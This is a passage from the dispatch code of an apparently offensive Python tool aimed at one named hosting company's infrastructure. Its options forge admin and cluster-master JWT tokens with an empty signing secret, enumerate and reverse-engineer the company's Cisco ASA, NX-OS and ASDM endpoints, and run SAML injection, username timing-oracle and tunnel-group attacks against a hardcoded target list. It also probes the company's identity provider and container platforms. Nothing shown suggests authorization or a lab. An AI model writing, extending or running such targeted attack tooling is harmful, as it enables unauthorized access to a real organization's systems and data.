        if not HAS_CRYPTO_AUDIT:
            print("[-] jwt_crypto_analyzer module not available")
        else:
            auditor = JWTCryptoAnalyzer()
            # Forge MacStadium admin tokens and print
            for payload in MACSTADIUM_FORGE_PAYLOADS:
                tok = forge_token(payload, secret=b'', alg='HS256')
                print(f"[FORGE] {payload['sub']}: {tok}")
            print(auditor.report())

    elif args.jwt:
        ablation.banner()
        if not HAS_CRYPTO_AUDIT:
            print("[-] jwt_crypto_analyzer module not available")
        else:
            auditor = JWTCryptoAnalyzer()
            findings = auditor.analyze_token(args.jwt)
            print(auditor.report())
            print(json.dumps(findings, indent=2))

    elif args.asa:
        ablation.banner()
        if not HAS_ASA_ENUM:
            print("[-] asa_enum module not available")
        else:
            print("[*] Enumerating MacStadium Cisco ASA instances...")
            results = enumerate_macstadium_asas()
            print(json.dumps(results, indent=2, default=str))

    elif args.nxos:
        ablation.banner()
        if not HAS_NXOS:
            print("[-] nxos_enum module not available")
        else:
            print("[*] Enumerating Cisco NX-OS / ACI / APIC targets...")
            result = ablation.enumerate_nxos()
            print(json.dumps(result, indent=2, default=str))

    elif getattr(args, 'asdm_re', None):
        ablation.banner()
        if not HAS_ASDM_RE:
            print("[-] cisco_asdm_download_re module not available")
        else:
            def _run_asdm(host, port=443):
                dl = ASDMDownloader(host, port)
                jnlp = dl.find_jnlp()
                jars_downloaded = {}
                if jnlp:
                    print(f"  [+] JNLP found ({len(jnlp)} bytes)")
                    jar_paths = dl.parse_jnlp(jnlp)
                    print(f"  [+] JAR paths: {jar_paths}")
                    for jar_path in jar_paths:
                        data = dl.download_jar(jar_path)
                        if data:
                            jars_downloaded[jar_path] = data
                else:
                    print(f"  [-] No JNLP — trying direct JAR paths")
                    for path in ['/admin/public/asdm.jar', '/asdm.jar', '/admin/public/asdm-launcher.jar']:
                        data = dl.download_jar(path)
                        if data:
                            jars_downloaded[path] = data
                            print(f"  [+] Direct JAR hit: {path} ({len(data)} bytes)")
                for path, data in jars_downloaded.items():
                    print(f"  [*] Analyzing JAR: {path}")
                    analyzer = ASDMJARAnalyzer(data, jar_name=path)
                    result = analyzer.analyze()
                    print(json.dumps(result, indent=2, default=str))
                if not jars_downloaded:
                    print(f"  [-] No JARs retrieved — JNLP:{'found' if jnlp else 'none'}")
            host = args.asdm_re
            print(f"[*] ASDM Download + RE: {host}")
            _run_asdm(host)

    elif getattr(args, 'asdm_re_all', False):
        ablation.banner()
        if not HAS_ASDM_RE:
            print("[-] cisco_asdm_download_re module not available")
        else:
            def _run_asdm_target(asa):
                host, port = asa['host'], asa['port']
                print(f"\n[*] ASDM RE: {asa['label']} ({host}:{port})")
                dl = ASDMDownloader(host, port)
                jnlp = dl.find_jnlp()
                jars_downloaded = {}
                if jnlp:
                    print(f"  [+] JNLP found ({len(jnlp)} bytes)")
                    jar_paths = dl.parse_jnlp(jnlp)
                    for jar_path in jar_paths:
                        data = dl.download_jar(jar_path)
                        if data:
                            jars_downloaded[jar_path] = data
                else:
                    for path in ['/admin/public/asdm.jar', '/asdm.jar', '/admin/public/asdm-launcher.jar']:
                        data = dl.download_jar(path)
                        if data:
                            jars_downloaded[path] = data
                            print(f"  [+] Direct JAR: {path} ({len(data)} bytes)")
                for path, data in jars_downloaded.items():
                    analyzer = ASDMJARAnalyzer(data, jar_name=path)
                    result = analyzer.analyze()
                    print(json.dumps(result, indent=2, default=str))
                if not jars_downloaded:
                    print(f"  [-] No JARs — JNLP:{'found' if jnlp else 'none'}")
            for asa in MACSTADIUM_ASAS:
                _run_asdm_target(asa)

    elif getattr(args, 'webvpn_js', None):
        ablation.banner()
        if not HAS_WEBVPN_JS:
            print("[-] cisco_webvpn_js_re module not available")
        else:
            host = args.webvpn_js
            print(f"[*] WebVPN JS RE: {host}")
            re_eng = WebVPNJSRE(host, 443)
            result = re_eng.analyze()
            print(json.dumps(result, indent=2, default=str))

    elif getattr(args, 'webvpn_js_all', False):
        ablation.banner()
        if not HAS_WEBVPN_JS:
            print("[-] cisco_webvpn_js_re module not available")
        else:
            for asa in MACSTADIUM_ASAS:
                print(f"\n[*] WebVPN JS RE: {asa['label']} ({asa['host']})")
                re_eng = WebVPNJSRE(asa['host'], asa['port'])
                result = re_eng.analyze()
                print(json.dumps(result, indent=2, default=str))

    elif getattr(args, 'ios_re', None):
        ablation.banner()
        if not HAS_IOS_RE:
            print("[-] cisco_ios_re module not available")
        else:
            result = analyze_ios_firmware(args.ios_re)
            print(json.dumps(result, indent=2, default=str))

    elif getattr(args, 'config_re', None):
        ablation.banner()
        if not HAS_CONFIG_RE:
            print("[-] cisco_config_re module not available")
        else:
            with open(args.config_re) as f:
                text = f.read()
            re_eng = CiscoConfigRE(text)
            result = re_eng.analyze_all()
            print(json.dumps(result, indent=2, default=str))

    elif getattr(args, 'rommon_re', None):
        ablation.banner()
        if not HAS_ROMMON_RE:
            print("[-] cisco_rommon_re module not available")
        else:
            confreg = int(args.rommon_re, 16) if args.rommon_re.startswith('0x') else int(args.rommon_re)
            re_eng = ROMMONBypassRE()
            result = re_eng.analyze_confreg(confreg)
            print(json.dumps(result, indent=2, default=str))

    elif getattr(args, 'cisco_api', None):
        ablation.banner()
        if not HAS_CISCO_API:
            print("[-] cisco_api_enum module not available")
        else:
            enum = CiscoAPIEnum(args.cisco_api)
            result = enum.run()
            print(json.dumps(result, indent=2, default=str))

    elif getattr(args, 'guestshell', None):
        ablation.banner()
        if not HAS_GUESTSHELL:
            print("[-] cisco_nxos_guestshell_re module not available")
        else:
            re_eng = NXOSGuestshellRE(args.guestshell)
            result = re_eng.analyze()
            print(json.dumps(result, indent=2, default=str))

    elif getattr(args, 'cstp', None) or getattr(args, 'cstp_all', False):
        ablation.banner()
        if not HAS_CSTP:
            print("[-] cisco_cstp_attack module not available")
        else:
            targets = MACSTADIUM_ASAS if getattr(args, 'cstp_all', False) else [
                {'host': args.cstp, 'port': 443, 'label': args.cstp}
            ]
            for t in targets:
                print(f"\n[*] CSTP/HostScan/DAP RE: {t['label']} ({t['host']})")
                result = analyze_asa_attack_surface(t['host'], t['port'])
                print(json.dumps(result, indent=2, default=str))

    elif getattr(args, 'go_re', None):
        ablation.banner()
        if not HAS_CSTP:
            print("[-] cisco_cstp_attack module not available (GoBinaryRE lives there)")
        else:
            print(f"[*] Go binary RE: {args.go_re}")
            result = analyze_go_binary(args.go_re)
            print(json.dumps(result, indent=2, default=str))

    elif getattr(args, 'saml_sp', None) or getattr(args, 'saml_sp_all', False):
        ablation.banner()
        if not HAS_CSTP:
            print("[-] cisco_cstp_attack module not available")
        else:
            targets = MACSTADIUM_ASAS if getattr(args, 'saml_sp_all', False) else [
                {'host': args.saml_sp, 'port': 443, 'label': args.saml_sp}
            ]
            for t in targets:
                print(f"\n[*] SAML SP injection RE: {t['label']} ({t['host']})")
                result = analyze_saml_sp(t['host'], t['port'])
                print(json.dumps(result, indent=2, default=str))

    elif getattr(args, 'username_oracle', None) or getattr(args, 'username_oracle_all', False):
        ablation.banner()
        if not HAS_CSTP:
            print("[-] cisco_cstp_attack module not available")
        else:
            targets = MACSTADIUM_ASAS if getattr(args, 'username_oracle_all', False) else [
                {'host': args.username_oracle, 'port': 443, 'label': args.username_oracle}
            ]
            for t in targets:
                print(f"\n[*] Username timing oracle: {t['label']} ({t['host']})")
                result = analyze_username_oracle(t['host'], t['port'])
                print(json.dumps(result, indent=2, default=str))

    elif getattr(args, 'tunnel_groups', None) or getattr(args, 'tunnel_groups_all', False):
        ablation.banner()
        if not HAS_CSTP:
            print("[-] cisco_cstp_attack module not available")
        else:
            targets = MACSTADIUM_ASAS if getattr(args, 'tunnel_groups_all', False) else [
                {'host': args.tunnel_groups, 'port': 443, 'label': args.tunnel_groups}
            ]
            for t in targets:
                print(f"\n[*] Tunnel group enum: {t['label']} ({t['host']})")
                result = analyze_tunnel_groups(t['host'], t['port'])
                print(json.dumps(result, indent=2, default=str))

    elif getattr(args, 'radius_re', None) or getattr(args, 'radius_re_all', False):
        ablation.banner()
        if not HAS_CSTP:
            print("[-] cisco_cstp_attack module not available")
        else:
            targets = MACSTADIUM_ASAS if getattr(args, 'radius_re_all', False) else [
                {'host': args.radius_re, 'port': 443, 'label': args.radius_re}
            ]
            for t in targets:
                print(f"\n[*] RADIUS class attr RE: {t['label']} ({t['host']})")
                result = analyze_radius_class_attr(t['host'], t['port'])
                print(json.dumps(result, indent=2, default=str))

    elif getattr(args, 'orka_oidc', False):
        ablation.banner()
        if not HAS_ORKA_OIDC:
            print("[-] orka_oidc_re module not available")
        else:
            print("[*] Orka3 OIDC RE + JWT attack suite...")
            result = orka_oidc_run()
            print(json.dumps(result, indent=2, default=str))

    elif getattr(args, 'orka_jwt', False):
        ablation.banner()
        if not HAS_ORKA_OIDC:
            print("[-] orka_oidc_re module not available")
        else:
            result = orka_jwt_analysis()
            print(json.dumps(result, indent=2, default=str))

    elif getattr(args, 'orka_binary_re', False):
        ablation.banner()
        if not HAS_ORKA_OIDC:
            print("[-] orka_oidc_re module not available")
        else:
            result = get_binary_re_findings()
            print(json.dumps(result, indent=2, default=str))

    elif getattr(args, 'forge_admin', False):
        if not HAS_ORKA_OIDC:
            print("[-] orka_oidc_re module not available")
        else:
            print(forge_admin_token())

    elif getattr(args, 'forge_masters', False):
        if not HAS_ORKA_OIDC:
            print("[-] orka_oidc_re module not available")
        else:
            print(forge_system_masters_token())

    elif getattr(args, 'oidc_discovery', False):
        ablation.banner()
        if not HAS_ORKA_OIDC:
            print("[-] orka_oidc_re module not available")
        else:
            print("[*] Probing idp.macstadium.com OIDC discovery...")
            result = probe_oidc_discovery()
            print(json.dumps(result, indent=2, default=str))

    elif args.containers:
        ablation.banner()
        print("[*] Full container/platform analysis...\n")
        docker_enum = DockerEnumerator()
        docker_enum.enumerate_all()
        print(docker_enum.report())
        print()
        k8s_enum = K8sEnumerator()
        k8s_enum.enumerate_all()
        print(k8s_enum.report())
        print()
        orka_enum = OrkaEnumerator()
        orka_enum.enumerate_all()
        print(orka_enum.report())
    
    else:
        ablation.run_autonomous()
        print("[+] Analysis complete!")
        print(f"[+] Full report: /tmp/ablation-report.json")
        print(f"[+] Summary: /tmp/ablation-summary.txt")

if __name__ == '__main__':
    import os
    main()
